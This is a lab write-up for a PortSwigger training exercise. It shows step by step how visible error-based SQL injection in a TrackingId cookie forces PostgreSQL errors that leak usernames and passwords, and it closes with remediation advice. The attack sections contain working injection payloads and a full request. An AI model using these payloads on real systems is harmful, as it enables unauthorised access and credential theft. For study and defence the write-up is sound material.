# PortSwigger Lab: Visible Error-Based SQL Injection

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** SQL Injection / Visible Error-Based  
**Database:** PostgreSQL  

---

## Overview

This lab demonstrates **visible error-based SQL injection** — a technique where the database error message itself leaks sensitive data directly in the HTTP response. Unlike blind SQLi which requires inferring data through side channels, this technique forces the database to include actual data values inside the error message.

The key difference from the previous blind SQLi lab:

| Type | Data Channel | Speed |
|------|-------------|-------|
| Blind error-based (Oracle) | HTTP 500 vs 200 — infer one bit at a time | Slow — 720+ requests |
| Visible error-based (PostgreSQL) | Full value in error message body | Fast — one request per column |

---

## Vulnerability

The `TrackingId` cookie is passed unsanitised into a SQL query. The application returns verbose database error messages directly in the response — leaking the full query structure and eventually the data values themselves.

---

## Methodology

```
Confirm injection → Comment out query → Build CAST subquery →
Fix boolean expression → Retrieve username → Clear TrackingId →
Extract password via error message → Login
```

---

## 1. Confirming the Injection Point

### Step 1 — Trigger a Syntax Error

Appended a single quote to the TrackingId cookie in Burp Repeater:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

**Response:** HTTP 500 with verbose error:
```
ERROR: unterminated quoted string at or near "'ogAZZfxtOKUELbuJ''
LINE 1: SELECT ... WHERE TrackingId='ogAZZfxtOKUELbuJ''
```

**Key observation:** The error message reveals the **full SQL query** — confirming injection and showing the value is inside a single-quoted string.

### Step 2 — Comment Out the Rest of the Query

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

**Response:** HTTP 200 — `--` comments out the rest including the extra quote. Query now syntactically valid.

---

## 2. Building the Error-Based Extraction Payload

### Step 3 — Test CAST Subquery

```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

**Response:** Error — `AND` condition must be a boolean expression, not an integer.

### Step 4 — Fix Boolean Expression

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

**Response:** HTTP 200 — valid query. `1=CAST(...)` makes it a boolean comparison.

**Why CAST works for extraction:** When you try to cast a string value to an integer, PostgreSQL throws an error that includes the actual string value:

```
ERROR: invalid input syntax for type integer: "administrator"
```

The data leaks directly in the error message — no need for binary search or side channels.

---

## 3. Extracting the Username

### Step 5 — Query the Users Table

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

**Response:** Error — query truncated due to character limit. Comment characters `--` not included.

### Step 6 — Clear TrackingId to Free Characters

```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

**Response:** New error — query returned more than one row.

### Step 7 — Limit to One Row

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Response:** Error message leaks the first username:

```
ERROR: invalid input syntax for type integer: "administrator"
```

**Username confirmed:** `administrator`

---

## 4. Extracting the Password

### Step 8 — Extract Password Directly

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Full request:**

```http
GET / HTTP/2
Host: 0a3400180472936780e612a200e70018.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password From users LIMIT 1) AS INT)--; session=3HG4W8XssviE5wVlCbIH7sLJBZsD65x1
```

**Response body:**

```html
<h4>ERROR: invalid input syntax for type integer: "x1xwhtmp9eee4virigad"</h4>
<p class=is-warning>ERROR: invalid input syntax for type integer: "x1xwhtmp9eee4virigad"</p>
```

**Password extracted:** `x1xwhtmp9eee4virigad`

---

## 5. Attack Flow Summary

```
TrackingId=ogAZZfxtOKUELbuJ'  →  Verbose error reveals full SQL query
        ↓
TrackingId=ogAZZfxtOKUELbuJ'--  →  Comment fixes syntax
        ↓
AND 1=CAST((SELECT 1) AS int)--  →  Valid boolean CAST structure confirmed
        ↓
AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
→ ERROR: invalid input syntax for type integer: "administrator"
        ↓
AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
→ ERROR: invalid input syntax for type integer: "x1xwhtmp9eee4virigad"
        ↓
Login: administrator / x1xwhtmp9eee4virigad → Lab solved
```

---

## 6. Why This Works — The CAST Trick Explained

PostgreSQL tries to evaluate `CAST((SELECT password FROM users LIMIT 1) AS int)`.

The password is a string like `x1xwhtmp9eee4virigad`. PostgreSQL cannot convert this to an integer, so it throws a type conversion error — and includes the actual value in the error message:

```
ERROR: invalid input syntax for type integer: "x1xwhtmp9eee4virigad"
```

This turns a type system behaviour into a **data exfiltration channel**.

**Why `LIMIT 1` is essential:**
- Without it, the subquery returns multiple rows
- PostgreSQL throws a different error: "more than one row returned by a subquery"
- The data value never appears in the error

---

## 7. Comparison — Blind vs Visible Error-Based

| Feature | Blind Error-Based (Oracle) | Visible Error-Based (PostgreSQL) |
|---------|---------------------------|----------------------------------|
| Data channel | HTTP status code (500 vs 200) | Error message body |
| Requests needed | 720+ (20 chars × 36 options) | 1 request per value |
| Speed | Slow | Fast |
| Automation needed | Yes — Python script | No — single Burp Repeater request |
| Database | Oracle | PostgreSQL |
| Key function | TO_CHAR(1/0) | CAST(value AS int) |
| Difficulty | Higher | Lower |

---

## 8. Key Takeaways

- **Verbose error messages are a critical misconfiguration** — the application revealed the full SQL query in the first error, making exploitation trivial
- **CAST-based extraction is PostgreSQL-specific** — the type conversion error leaks actual data values; this technique doesn't work the same way on Oracle or MySQL
- **Character limits can break payloads** — clearing the TrackingId value was necessary to fit the full payload; always check for truncation when a payload stops working
- **LIMIT 1 is essential** — subqueries in boolean expressions must return exactly one row; multiple rows produce a different error that doesn't leak data
- **Visible error-based is faster than blind** — entire values extracted in one request vs hundreds; if an application shows database errors, always try this technique first
- **Comment characters are load-bearing** — `--` is not optional cleanup; without it the injected quote breaks the query syntax

---

## 9. Real-World Relevance

Visible error-based SQLi appears when:
- Applications display raw database error messages (common in development environments left in production)
- Custom error pages include exception details
- API responses include stack traces or query errors

In bug bounty, this is one of the fastest paths from injection to data extraction — if you see a database error message in a response, immediately test for visible error-based extraction.

---

## 10. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Unsanitised cookie in SQL query | Critical | Use parameterised queries — never concatenate user input |
| Verbose database errors in response | Critical | Return generic error pages; log errors server-side only |
| Full query disclosed in error | Critical | Never expose internal query structure to users |
| No LIMIT on subquery | Medium | Validate query structure; use stored procedures |

**Secure parameterised query example:**
```sql
-- Vulnerable
SELECT * FROM tracking WHERE id = 'TrackingId_VALUE'

-- Secure (parameterised)
SELECT * FROM tracking WHERE id = $1
-- Pass TrackingId as parameter, never concatenated
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, request interception |
| Burp Repeater | Manual payload crafting and testing |

---

## References

- [PortSwigger — Visible Error-Based SQL Injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PostgreSQL Error Codes](https://www.postgresql.org/docs/current/errcodes-appendix.html)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
